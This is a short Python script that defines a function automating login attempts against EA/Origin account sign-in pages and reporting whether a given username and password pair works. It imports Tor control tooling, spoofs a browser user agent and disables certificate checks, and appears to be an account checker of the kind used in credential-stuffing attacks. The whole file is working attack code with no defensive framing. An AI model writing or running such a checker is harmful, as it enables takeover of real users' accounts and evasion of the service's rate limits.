import re
import requests
from stem import Signal
from stem.control import Controller
import math
import datetime
def checkacc(username, password, **kwargs):
	url = "https://accounts.ea.com:443/connect/auth?scope=basic.identity+basic.persona+signin+offline&locale=sv_SE&response_type=code&client_id=live.origin.com"
	sess = requests.session() 
	sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0"
	resp = sess.get(url, verify=False, **kwargs)
	url = resp.url
	page = resp.content
	auth = re.search(r'execution=(.*?)&', resp.url).group(1)
	url2 = 'https://signin.ea.com/p/web/login?execution=' + auth + '&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fscope%3Dbasic.identity%2Bbasic.persona%2Bsignin%2Boffline%26locale%3Dsv_SE%26response_type%3Dcode%26client_id%3Dlive.origin.com'
	cookies = {}
	for keys in resp.cookies.keys():
		cookies[keys] = resp.cookies[keys]
	postparam = {
	'email':username,
	'password':password,
	'_rememberMe':'off',
	'rememberMe':'off',
	'_eventId':'submit',
	'facebookAuth':''
	}
	sess.post(url2, data=postparam, headers={"Referer": url}, cookies=cookies, verify=False, **kwargs)
	try:
		test = sess.cookies['webun']
		return True
	except Exception:
		return False
		